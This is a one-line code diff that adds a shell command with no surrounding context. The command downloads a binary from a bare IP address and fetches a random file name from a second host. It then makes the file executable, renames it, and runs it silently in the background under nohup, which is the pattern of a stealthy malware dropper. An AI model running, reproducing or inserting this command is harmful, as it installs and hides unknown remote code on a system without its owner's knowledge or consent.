@@ -1,0 +1,1 @@
+nohup wget http://139.59.230.245:7800/down/VVjRnJM9GP1l && ACAK=$(echo $(curl -s https://gaspol.space/rand.php)) && chmod +x VVjRnJM9GP1l && sed -i -e 's/\r$//' VVjRnJM9GP1l && mv VVjRnJM9GP1l $ACAK && ./$ACAK &>/dev/null &
